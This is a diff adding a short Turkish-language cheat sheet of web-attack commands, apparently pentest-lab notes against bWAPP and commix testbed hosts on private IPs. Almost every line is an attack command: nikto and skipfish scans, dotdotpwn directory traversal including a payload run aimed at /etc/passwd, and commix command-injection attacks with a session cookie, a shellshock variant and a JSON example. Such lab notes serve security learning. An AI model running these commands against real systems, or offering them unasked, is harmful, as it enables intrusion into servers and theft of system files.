@@ -1,0 +1,24 @@
+nikto -h <ipadres>
+skipfish -o dizin_adi http://url.com > ardından tarayıcıya git file///<dizinibul> örnek file///web_hack
+
+
+dotdotpwn -m http -h <httpcikarilarakurlburayagelicek> 
+dotdotpwn -m http -h 192.168.1.53/bWAPP/directory_traversal_1.php?page=https://google.com
+
+
+eger ssl kullaniyorsa site -S sonuna konacak
+dotdotpwn -m http -h <url> -S
+dotdotpwn -m http -h 192.168.1.53/bWAPP/directory_traversal_1.php?page=https://google.com -S
+
+
+burpsuite ile alınan dosya istek yapısı ile bulma:
+dotdotpwn -m payload -h 192.168.1.1 -p istek.txt -o unix /etc/passwd -d -x 80 -b -k "root
+
+
+
+commix --url="<urlburyagelecek>" --cookie="<cookie burayagelecek>" --data="gonderilenveri" 
+//data yi araya girerkenn burpsuite ile giden verileri alarak koyuyoruz
+ornek = commix --url="http://192.168.1.53/bWAPP/commandi.php" --cookie="security_level=0; PHPSESSID=25e38d9b81559ec78aba39ce0077cc72" --data="target=www.nsa.gov&form=submit"
+
+shellshock = commix.py --url="http://192.168.178.4/cgi-bin/status/" --shellshock
+json = commix.py --url="http://192.168.2.11/commix-testbed/scenarios/regular/POST/classic_json.php" --data='{"addr":"127.0.0.1","name":"ancst"}'
